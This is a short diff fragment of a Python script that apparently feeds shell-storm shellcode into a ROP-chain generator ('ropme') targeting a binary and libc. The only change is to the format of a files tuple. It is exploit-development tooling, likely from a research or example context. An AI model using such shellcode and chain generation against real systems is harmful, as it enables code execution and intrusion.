@@ -21,7 +21,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
  +  "\x0f\x05"                                      # syscall
 )
 
-files = [(filename, 0)]
+files = [(filename, None, 0)]
 goal_resolver = goal.create_from_arguments(files, ["/lib/x86_64-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(shellcode)]])
 rop = ropme.rop(files, goal_resolver, archinfo.ArchAMD64, logging.CRITICAL)
 
